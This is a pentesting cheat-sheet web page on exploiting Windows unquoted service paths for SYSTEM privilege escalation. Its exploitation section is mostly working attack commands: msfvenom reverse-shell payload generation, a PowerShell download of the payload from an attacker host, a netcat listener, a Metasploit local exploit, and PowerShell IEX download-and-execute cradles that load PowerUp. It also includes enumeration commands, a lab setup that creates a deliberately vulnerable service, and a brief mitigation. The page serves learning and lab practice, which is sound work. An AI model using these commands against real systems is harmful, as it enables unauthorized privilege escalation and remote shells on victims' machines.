<!doctype html><html lang=en><head><meta charset=utf-8><meta name=description content="When a¬†service¬†is created whose¬†executable path¬†contains¬†spaces¬†and isn‚Äôt enclosed within¬†quotes, leads to a vulnerability known as Unquoted Service Path which allows a user to gain¬†SYSTEM¬†privileges (only if the vulnerable service is running with SYSTEM privilege level which most of the time it is)."><title>Unqoted Service Paths</title><meta name=viewport content="width=device-width,initial-scale=1"><link rel="shortcut icon" type=image/png href=https://hakbrain.xyz//icon.png><link href=https://hakbrain.xyz/styles.f40f9c8ac1c106641723dab5233fc67c.min.css rel=stylesheet><link href=https://hakbrain.xyz/styles/_light_syntax.86a48a52faebeaaf42158b72922b1c90.min.css rel=stylesheet id=theme-link><script src=https://hakbrain.xyz/js/darkmode.8bfc78cc60cc5da6df81ec79c82c3775.min.js></script>
<script src=https://hakbrain.xyz/js/util.9825137f5e7825e8553c68ce39ac9e44.min.js></script>
<link rel=stylesheet href=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.css integrity=sha384-R4558gYOUz8mP9YWpZJjofhk+zx0AS11p36HnD2ZKj/6JR5z27gSSULCNHIRReVs crossorigin=anonymous><script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/katex.min.js integrity=sha384-z1fJDqw8ZApjGO3/unPWUPsIymfsJmyrDVWC8Tv/a1HeOtGmkwNd/7xUS0Xcnvsx crossorigin=anonymous></script>
<script defer src=https://cdn.jsdelivr.net/npm/katex@0.15.1/dist/contrib/auto-render.min.js integrity=sha384-+XBljXPPiv+OzfbB3cVmLHf4hdUFHlWNZN5spNQ7rmHTXpd7WvJum6fIACpNNfIR crossorigin=anonymous></script>
<script src=https://unpkg.com/@floating-ui/core@0.7.3></script>
<script src=https://unpkg.com/@floating-ui/dom@0.5.4></script>
<script src=https://hakbrain.xyz/js/popover.abe6a51cc7138c5dff00f151dd627ad1.min.js></script>
<script src=https://hakbrain.xyz/js/code-title.b35124ad8db0ba37162b886afb711cbc.min.js></script>
<script src=https://hakbrain.xyz/js/clipboard.c20857734e53a3fb733b7443879efa61.min.js></script>
<script src=https://hakbrain.xyz/js/callouts.7723cac461d613d118ee8bb8216b9838.min.js></script>
<script>const BASE_URL="https://hakbrain.xyz/",fetchData=Promise.all([fetch("https://hakbrain.xyz/indices/linkIndex.1e47bda6b6ec4c1a91fec41d75ee4f2e.min.json").then(e=>e.json()).then(e=>({index:e.index,links:e.links})),fetch("https://hakbrain.xyz/indices/contentIndex.cfd8cc9466831b6a37e9c2b19f46dbb9.min.json").then(e=>e.json())]).then(([{index:e,links:t},n])=>({index:e,links:t,content:n})),render=()=>{const e=new URL(BASE_URL),t=e.pathname,n=window.location.pathname,s=t==n;addCopyButtons(),addTitleToCodeBlocks(),addCollapsibleCallouts(),initPopover("https://hakbrain.xyz",!0,!0);const o=document.getElementById("footer");if(o){const e=document.getElementById("graph-container");if(!e)return requestAnimationFrame(render);e.textContent="";const t=s&&!1;drawGraph("https://hakbrain.xyz",t,[{"/moc":"#4388cc"}],t?{centerForce:1,depth:-1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.5,linkDistance:1,opacityScale:3,repelForce:1,scale:1.4}:{centerForce:1,depth:1,enableDrag:!0,enableLegend:!1,enableZoom:!0,fontSize:.6,linkDistance:1,opacityScale:3,repelForce:2,scale:1.2})}},init=(e=document)=>{addCopyButtons(),addTitleToCodeBlocks(),renderMathInElement(e.body,{delimiters:[{left:"$$",right:"$$",display:!0},{left:"$",right:"$",display:!1}],throwOnError:!1})}</script><script type=module>
    import { attachSPARouting } from "https:\/\/hakbrain.xyz\/js\/router.9d4974281069e9ebb189f642ae1e3ca2.min.js"
    attachSPARouting(init, render)
  </script></head><script async src="https://www.googletagmanager.com/gtag/js?id=G-XYFD95KB4J"></script>
<script>var doNotTrack=!1;if(!doNotTrack){window.dataLayer=window.dataLayer||[];function gtag(){dataLayer.push(arguments)}gtag("js",new Date),gtag("config","G-XYFD95KB4J",{anonymize_ip:!1})}</script><body><div id=search-container><div id=search-space><input autocomplete=off id=search-bar name=search type=text aria-label=Search placeholder="Search for something..."><div id=results-container></div></div></div><script src=https://cdn.jsdelivr.net/npm/flexsearch@0.7.21/dist/flexsearch.bundle.js integrity="sha256-i3A0NZGkhsKjVMzFxv3ksk0DZh3aXqu0l49Bbh0MdjE=" crossorigin=anonymous defer></script>
<script defer src=https://hakbrain.xyz/js/full-text-search.24827f874defbbc6d529926cbfcfb493.min.js></script><div class=singlePage><header><h1 id=page-title><a href=https://hakbrain.xyz/>üï∏Ô∏è H@kBr4in</a></h1><div class=spacer></div><div id=search-icon><p>Search</p><svg tabindex="0" aria-labelledby="title desc" role="img" xmlns="http://www.w3.org/2000/svg" viewBox="0 0 19.9 19.7"><title id="title">Search Icon</title><desc id="desc">Icon to open search</desc><g class="search-path" fill="none"><path stroke-linecap="square" d="M18.5 18.3l-5.4-5.4"/><circle cx="8" cy="8" r="7"/></g></svg></div><div class=darkmode><input class=toggle id=darkmode-toggle type=checkbox tabindex=-1>
<label id=toggle-label-light for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="dayIcon" viewBox="0 0 35 35" style="enable-background:new 0 0 35 35"><title>Light Mode</title><path d="M6 17.5C6 16.672 5.328 16 4.5 16h-3C.672 16 0 16.672.0 17.5S.672 19 1.5 19h3C5.328 19 6 18.328 6 17.5zM7.5 26c-.414.0-.789.168-1.061.439l-2 2C4.168 28.711 4 29.086 4 29.5 4 30.328 4.671 31 5.5 31c.414.0.789-.168 1.06-.44l2-2C8.832 28.289 9 27.914 9 27.5 9 26.672 8.329 26 7.5 26zm10-20C18.329 6 19 5.328 19 4.5v-3C19 .672 18.329.0 17.5.0S16 .672 16 1.5v3C16 5.328 16.671 6 17.5 6zm10 3c.414.0.789-.168 1.06-.439l2-2C30.832 6.289 31 5.914 31 5.5 31 4.672 30.329 4 29.5 4c-.414.0-.789.168-1.061.44l-2 2C26.168 6.711 26 7.086 26 7.5 26 8.328 26.671 9 27.5 9zM6.439 8.561C6.711 8.832 7.086 9 7.5 9 8.328 9 9 8.328 9 7.5c0-.414-.168-.789-.439-1.061l-2-2C6.289 4.168 5.914 4 5.5 4 4.672 4 4 4.672 4 5.5c0 .414.168.789.439 1.06l2 2.001zM33.5 16h-3c-.828.0-1.5.672-1.5 1.5s.672 1.5 1.5 1.5h3c.828.0 1.5-.672 1.5-1.5S34.328 16 33.5 16zM28.561 26.439C28.289 26.168 27.914 26 27.5 26c-.828.0-1.5.672-1.5 1.5.0.414.168.789.439 1.06l2 2C28.711 30.832 29.086 31 29.5 31c.828.0 1.5-.672 1.5-1.5.0-.414-.168-.789-.439-1.061l-2-2zM17.5 29c-.829.0-1.5.672-1.5 1.5v3c0 .828.671 1.5 1.5 1.5s1.5-.672 1.5-1.5v-3C19 29.672 18.329 29 17.5 29zm0-22C11.71 7 7 11.71 7 17.5S11.71 28 17.5 28 28 23.29 28 17.5 23.29 7 17.5 7zm0 18c-4.136.0-7.5-3.364-7.5-7.5s3.364-7.5 7.5-7.5 7.5 3.364 7.5 7.5S21.636 25 17.5 25z"/></svg></label><label id=toggle-label-dark for=darkmode-toggle tabindex=-1><svg xmlns="http://www.w3.org/2000/svg" xmlns:xlink="http://www.w3.org/1999/xlink" id="nightIcon" viewBox="0 0 100 100" style="enable-background='new 0 0 100 100'"><title>Dark Mode</title><path d="M96.76 66.458c-.853-.852-2.15-1.064-3.23-.534-6.063 2.991-12.858 4.571-19.655 4.571C62.022 70.495 50.88 65.88 42.5 57.5 29.043 44.043 25.658 23.536 34.076 6.47c.532-1.08.318-2.379-.534-3.23-.851-.852-2.15-1.064-3.23-.534-4.918 2.427-9.375 5.619-13.246 9.491-9.447 9.447-14.65 22.008-14.65 35.369.0 13.36 5.203 25.921 14.65 35.368s22.008 14.65 35.368 14.65c13.361.0 25.921-5.203 35.369-14.65 3.872-3.871 7.064-8.328 9.491-13.246C97.826 68.608 97.611 67.309 96.76 66.458z"/></svg></label></div></header><article><h1>Unqoted Service Paths</h1><p class=meta>Last updated
Dec 9, 2022
<a href=https://github.com/vlagh3/hakbrain/tree/hugo/content/sheets/Unqoted%20Service%20Paths.md rel=noopener>Edit Source</a></p><ul class=tags><li><a href=https://hakbrain.xyz/tags/sheets/>Sheets</a></li></ul><aside class=mainTOC><details><summary>Table of Contents</summary><nav id=TableOfContents><ol><li><a href=#root-cause>Root Cause</a><ol><li><a href=#example>Example</a></li></ol></li><li><a href=#checklist>CheckList</a></li><li><a href=#exploitation>Exploitation</a><ol><li><a href=#manual>Manual</a></li><li><a href=#metasploit>Metasploit</a></li><li><a href=#powersploit>PowerSploit</a></li></ol></li><li><a href=#lab-environment-setup>Lab Environment Setup</a><ol><li><a href=#creating-users>Creating users</a></li><li><a href=#deploy-vulnerable-service>Deploy vulnerable service</a></li></ol></li><li><a href=#mitigation>Mitigation</a></li><li><a href=#refs>Refs</a></li><li><a href=#see-also>See Also</a></li></ol></nav></details></aside><p>When a¬†<strong>service</strong>¬†is created whose¬†<strong>executable path</strong>¬†contains¬†<strong><em>spaces</em></strong>¬†and isn‚Äôt enclosed within¬†<strong><em>quotes</em></strong>, leads to a vulnerability known as Unquoted Service Path which allows a user to gain¬†<strong>SYSTEM</strong>¬†privileges <em>(only if the vulnerable service is running with SYSTEM privilege level which most of the time it is)</em>. This happens due to how Windows handles spaces: if the service is not enclosed within quotes & is having spaces => it would handle the space as a break and pass the rest of the service path as an argument.</p><a href=#root-cause><h2 id=root-cause><span class=hanchor arialabel=Anchor># </span>Root Cause</h2></a><p>This is caused by the
<a href=https://docs.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa rel=noopener>CreateProcess</a> function which creates a new process. More specifically the <code>lpApplicationName</code> string parameter which can be the full path / filename of the module to be executed. If the filename is a long string spanning acrosss multiple sub directories, contains spaces and is not enclosed in quotation marks, it will be executed in the order from left to right until the space is reached & will append <code>.exe</code> @ the end of this spaced path.</p><a href=#example><h3 id=example><span class=hanchor arialabel=Anchor># </span>Example</h3></a><ul><li>Consider the following path: <code>C:\Program Files\A Sub\B Sub\C Sub\executeMe.exe</code></li><li>In order to run <code>executeMe.exe</code> the Windows API will interpret it in the following order<ul><li><code>C:\Program.exe</code></li><li><code>C:\Program Files\A.exe</code></li><li><code>C:\Program Files\A Sub\B.exe</code></li><li><code>C:\Program Files\A Sub\B Sub\C.exe</code></li><li><code>C:\Program Files\A Sub\B Sub\C Sub\executeMe.exe</code></li></ul></li><li>If <code>Program.exe</code> is not found, then <code>A.exe</code> will be executed and so on</li></ul><a href=#checklist><h2 id=checklist><span class=hanchor arialabel=Anchor># </span>CheckList</h2></a><ul><li><input disabled type=checkbox> List all unquoted service paths <em>(minus built-in Windows services)</em>. Are there any available?<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>wmic service get name,pathname,displayname,startmode <span class=p>|</span> findstr /i auto <span class=p>|</span> findstr /i /v <span class=s2>&#34;C:\Windows\\&#34;</span> <span class=p>|</span> findstr /i /v <span class=s2>&#34;&#34;&#34;
</span></span></span><span class=line><span class=cl><span class=s2>wmic service get name,displayname,pathname,startmode | findstr /i /v &#34;</span>C:<span class=se>\\</span>Windows<span class=se>\\</span>system32<span class=se>\\</span><span class=s2>&#34; |findstr /i /v &#34;&#34;&#34;</span>
</span></span><span class=line><span class=cl>gwmi -class Win32_Service -Property Name, DisplayName, PathName, StartMode <span class=p>|</span> Where <span class=o>{</span><span class=nv>$_</span>.StartMode -eq <span class=s2>&#34;Auto&#34;</span> -and <span class=nv>$_</span>.PathName -notlike <span class=s2>&#34;C:\Windows*&#34;</span> -and <span class=nv>$_</span>.PathName -notlike <span class=s1>&#39;&#34;*&#39;</span><span class=o>}</span> <span class=p>|</span> <span class=k>select</span> PathName,DisplayName,Name <span class=c1># (PS)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback></code></pre></td></tr></table></div></div></li><li><input disabled type=checkbox> With what priviliges is the targetted service running <em>(should be as <code>LocalSystem</code>)</em> & what&rsquo;s the absolute path of the executable ?<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sc qc &lt;service-name&gt; 
</span></span><span class=line><span class=cl><span class=c1># Look for the following</span>
</span></span><span class=line><span class=cl><span class=c1>#  START_TYPE is it AUTO_START?</span>
</span></span><span class=line><span class=cl><span class=c1>#  BINARY_PATH_NAME</span>
</span></span><span class=line><span class=cl><span class=c1>#  SERVICE_START_NAME</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback></code></pre></td></tr></table></div></div></li><li><input disabled type=checkbox> Does your user have write access in one of the folders where the binary path resides?<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Do this for every one of them </span>
</span></span><span class=line><span class=cl>icacls <span class=s2>&#34;C:\path\to\dir\of\your\subdir&#34;</span>
</span></span><span class=line><span class=cl>Get-acl <span class=s1>&#39;C:\path\to\dir&#39;</span> <span class=p>|</span> % <span class=o>{</span><span class=nv>$_</span>.access<span class=o>}</span>   <span class=c1># (PS)</span>
</span></span><span class=line><span class=cl><span class=c1># Looking for write acesss on one of your groups (e.g BUILTIN\Users)</span>
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback></code></pre></td></tr></table></div></div></li><li><input disabled type=checkbox> Do u have the rights to restart the service? If not, it should be an auto-start service so that upon rebooting the system it communicates with the
<a href=https://docs.microsoft.com/en-us/windows/win32/services/service-control-manager rel=noopener>Service Control Manager</a> & gets your payload executed<div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># If you&#39;re confused about what this command spits out</span>
</span></span><span class=line><span class=cl><span class=c1># check out this: http://woshub.com/set-permissions-on-windows-service/</span>
</span></span><span class=line><span class=cl>sc sdshow &lt;service-name&gt;
</span></span></code></pre></td></tr></table></div></div><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback></code></pre></td></tr></table></div></div></li></ul><a href=#exploitation><h2 id=exploitation><span class=hanchor arialabel=Anchor># </span>Exploitation</h2></a><p>Considering that we have a low privilege shell already on the target system & all of the requirments above are met. Then we can just drop our malicious executable <code>B.exe</code> in <code>C:\Program Files\A Sub\</code>. When the system boots, Windows auto starts some of its services.¬†Services on Windows communicate with the¬†
<a href=https://en.wikipedia.org/wiki/Service_Control_Manager rel=noopener><em>Service Control Manager</em></a>¬†which is responsible to start, stop and interact with these service processes. It starts this service with whatever privileges it has to run, thus letting us run whatever we want as <code>SYSTEM</code><em>(read more
<a href=https://stackoverflow.com/questions/510170/the-difference-between-the-local-system-account-and-the-network-service-acco rel=noopener>here</a> about differences between accounts & privileges)</em></p><blockquote><p>For a more concrete example check out <a href=/write-ups/thm/Steel-Mountain#privesc-w-unquoted-service-path rel=noopener class=internal-link data-src=/write-ups/thm/Steel-Mountain>write-ups/thm/Steel Mountain</a></p></blockquote><a href=#manual><h3 id=manual><span class=hanchor arialabel=Anchor># </span>Manual</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span><span class=lnt>12
</span><span class=lnt>13
</span><span class=lnt>14
</span><span class=lnt>15
</span><span class=lnt>16
</span><span class=lnt>17
</span><span class=lnt>18
</span><span class=lnt>19
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Generate payload</span>
</span></span><span class=line><span class=cl>msfvenom -p windows/shell_reverse_tcp <span class=nv>LHOST</span><span class=o>=</span>wlan0 <span class=nv>LPORT</span><span class=o>=</span><span class=m>1337</span> -f exe -o B.exe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Transfer to target</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># through impacket&#39;s smb server</span>
</span></span><span class=line><span class=cl>host: python /usr/share/doc/python-impacket/examples/smbserver.py sharedfolder .
</span></span><span class=line><span class=cl>target: copy <span class=se>\\</span>LHOST<span class=se>\s</span>haredfolder<span class=se>\B</span>.exe .
</span></span><span class=line><span class=cl><span class=c1># or powershell</span>
</span></span><span class=line><span class=cl>powershell -Command Invoke-WebRequest -Uri http://LHOST/B.exe -OutFile B.exe
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Start listener </span>
</span></span><span class=line><span class=cl>nc -nvlp <span class=m>1337</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Restart service &amp; profit</span>
</span></span><span class=line><span class=cl>sc stop &lt;service-name&gt;
</span></span><span class=line><span class=cl>sc start &lt;service-name&gt;
</span></span><span class=line><span class=cl><span class=c1># if access is denied just reboot</span>
</span></span><span class=line><span class=cl>shutdown /r /t <span class=m>0</span>
</span></span></code></pre></td></tr></table></div></div><a href=#metasploit><h3 id=metasploit><span class=hanchor arialabel=Anchor># </span>Metasploit</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span><span class=lnt>11
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Setup listener</span>
</span></span><span class=line><span class=cl>use exploit/multi/handler  
</span></span><span class=line><span class=cl><span class=nb>set</span> payload windows/meterpreter/reverse_tcp  
</span></span><span class=line><span class=cl><span class=nb>set</span> lhost &lt;ip&gt;
</span></span><span class=line><span class=cl><span class=nb>set</span> lport &lt;port&gt;
</span></span><span class=line><span class=cl>exploit -j
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Exploit</span>
</span></span><span class=line><span class=cl>use exploit/windows/local/trusted_service_path  
</span></span><span class=line><span class=cl><span class=nb>set</span> session <span class=m>1</span>  
</span></span><span class=line><span class=cl>exploit
</span></span></code></pre></td></tr></table></div></div><a href=#powersploit><h3 id=powersploit><span class=hanchor arialabel=Anchor># </span>PowerSploit</h3></a><ul><li>Get a local copy of
<a href=https://github.com/PowerShellMafia/PowerSploit/blob/master/Privesc/PowerUp.ps1 rel=noopener>PowerUp</a></li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
</span><span class=lnt> 2
</span><span class=lnt> 3
</span><span class=lnt> 4
</span><span class=lnt> 5
</span><span class=lnt> 6
</span><span class=lnt> 7
</span><span class=lnt> 8
</span><span class=lnt> 9
</span><span class=lnt>10
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Setup local http/smb server to serve PowerUp</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Call Get-ServiceUnquoted from PowerUp without touching the disk</span>
</span></span><span class=line><span class=cl>powershell -nop -exec bypass -c <span class=s2>&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;http://LHOST/PowerUp.ps1&#39;);Get-ServiceUnquoted&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Checks for every spaced path, whether the context of the cmd shell  have write/modify access or not.</span>
</span></span><span class=line><span class=cl>powershell -nop -exec bypass -c <span class=s2>&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Get-ChildItem C:\ -Recurse | Get-ModifiablePath&#34;</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># patches the command given to it as an argument to the pre-compiled C# executable service binary to the specified path.</span>
</span></span><span class=line><span class=cl>powershell -nop -exec bypass -c <span class=s2>&#34;IEX(New-Object Net.WebClient).DownloadString(&#39;https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1&#39;);Write-ServiceBinary -Name &#39;Some Vulnerable Service&#39; -Command &#39;\\LHOST\sharedfolder\B.exe&#39; -Path &#39;C:\Program Files\A Subfolder\B.exe&#39;&#34;</span>
</span></span></code></pre></td></tr></table></div></div><a href=#lab-environment-setup><h2 id=lab-environment-setup><span class=hanchor arialabel=Anchor># </span>Lab Environment Setup</h2></a><a href=#creating-users><h3 id=creating-users><span class=hanchor arialabel=Anchor># </span>Creating users</h3></a><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span><span class=lnt>4
</span><span class=lnt>5
</span><span class=lnt>6
</span><span class=lnt>7
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl><span class=c1># Create a new user &amp; add him to the Administrators group</span>
</span></span><span class=line><span class=cl>net user dumbadmin /add
</span></span><span class=line><span class=cl>net localgroup Administrators dumbadmin /add
</span></span><span class=line><span class=cl>net localgroup Users dumbadmin /delete
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=c1># Create a low-privileged user</span>
</span></span><span class=line><span class=cl>net user normie /add
</span></span></code></pre></td></tr></table></div></div><p>This is what you should have now</p><p><img src="/write-ups/images/Pasted image 20220821085517.png" width=auto></p><a href=#deploy-vulnerable-service><h3 id=deploy-vulnerable-service><span class=hanchor arialabel=Anchor># </span>Deploy vulnerable service</h3></a><p>Login as the <code>dumbadmin</code> user & spawn a priviliged command prompt, then use
<a href=https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/sc-create rel=noopener>sc</a> to create the service</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>sc create <span class=s2>&#34;Vulnerable Service&#34;</span> <span class=nv>binpath</span><span class=o>=</span> <span class=s2>&#34;C:\Program Files\A Sub\B Sub\C Sub\ape.exe&#34;</span> <span class=nv>Displayname</span><span class=o>=</span> <span class=s2>&#34;Service Vuln to Unqoted Service Path&#34;</span> <span class=nv>start</span><span class=o>=</span> auto
</span></span></code></pre></td></tr></table></div></div><p>Now create the folders & assign write permissions to <code>BUILTIN\Users</code> on <code>A Sub</code> or <code>B Sub</code> using
<a href=https://ss64.com/nt/icacls.html rel=noopener>icacls</a></p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
</span><span class=lnt>2
</span><span class=lnt>3
</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-bash data-lang=bash><span class=line><span class=cl>mkdir <span class=s2>&#34;C:\Program Files\A Sub\B Sub\C Sub&#34;</span>
</span></span><span class=line><span class=cl>icacls <span class=s2>&#34;C:\Program Files\A Sub&#34;</span>
</span></span><span class=line><span class=cl>icacls <span class=s2>&#34;C:\Program Files\A Sub&#34;</span> /grant <span class=s2>&#34;BUILTIN\Users&#34;</span>:W
</span></span></code></pre></td></tr></table></div></div><p><img src="/write-ups/images/Pasted image 20220821090209.png" width=auto></p><p>The part we&rsquo;re interested in is the first line: <code>A Sub BUILTIN\Users:(W)</code>. This confirms that any normal users have write access to the <code>A Sub</code> directory
To finally verify that everything is running as expected we can find every service which isn&rsquo;t enclosed in double quotes</p><p><img src="/write-ups/images/Pasted image 20220821090532.png" width=auto></p><a href=#mitigation><h2 id=mitigation><span class=hanchor arialabel=Anchor># </span>Mitigation</h2></a><p>Gets all the services from¬†<code>HKLM\SYSTEM\CurrentControlSet\services</code> & find those services with spaces and without quotes, prepends and appends double quotes to the service binary executable and fixes it.</p><a href=#refs><h2 id=refs><span class=hanchor arialabel=Anchor># </span>Refs</h2></a><ul><li><a href=https://medium.com/@SumitVerma101/windows-privilege-escalation-part-1-unquoted-service-path-c7a011a8d8ae rel=noopener>Windows Privilege Escalation ‚Äî Part 1 (Unquoted Service Path)</a></li><li><a href=https://attack.mitre.org/techniques/T1574/009/ rel=noopener>Hijack Execution Flow: Path Interception by Unqoted Path &ndash; MITRE</a></li></ul><a href=#see-also><h2 id=see-also><span class=hanchor arialabel=Anchor># </span>See Also</h2></a></article><hr><div class=page-end id=footer><div class=backlinks-container><h3>Backlinks</h3><ul class=backlinks><li><a href=/write-ups/thm/Steel-Mountain/ data-ctx="sheets/Unqoted Service Paths" data-src=/write-ups/thm/Steel-Mountain class=internal-link>Steel Mountain</a></li></ul></div><div><script src=https://cdn.jsdelivr.net/npm/d3@6.7.0/dist/d3.min.js integrity="sha256-+7jaYCp29O1JusNWHaYtgUn6EhuP0VaFuswhNV06MyI=" crossorigin=anonymous></script><h3>Interactive Graph</h3><div id=graph-container></div><style>:root{--g-node:var(--secondary);--g-node-active:var(--primary);--g-node-inactive:var(--visited);--g-link:var(--outlinegray);--g-link-active:#5a7282}</style><script src=https://hakbrain.xyz/js/graph.abd4bc2af3869a96524d7d23b76152c7.js></script></div></div><div id=contact_buttons><footer><p>Made by Vl@gh3 using <a href=https://github.com/jackyzha0/quartz>Quartz</a>, ¬© 2022</p><ul><li><a href=https://hakbrain.xyz/>Home</a></li><li><a href=https://twitter.com/vlaghe1>Twitter</a></li><li><a href=https://github.com/vlagh3>Github</a></li></ul></footer></div></div></body></html>